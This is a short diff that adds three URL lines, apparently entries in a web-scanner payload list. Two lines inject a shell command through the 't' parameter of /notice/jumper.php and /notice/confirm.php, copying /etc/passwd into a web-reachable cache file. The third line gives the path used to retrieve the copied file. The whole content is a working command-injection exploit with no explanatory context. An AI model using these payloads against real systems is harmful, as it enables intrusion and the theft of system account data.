@@ -1,0 +1,3 @@
+/notice/jumper.php?t=;cp+/etc/passwd+/www/report/cache/1a2.txt||echo&u=xYOJFKCwSZ
+/report/cache/1a2.txt
+/notice/confirm.php?t=;cp+/etc/passwd+/www/report/cache/1a2.txt||echo&u=hello
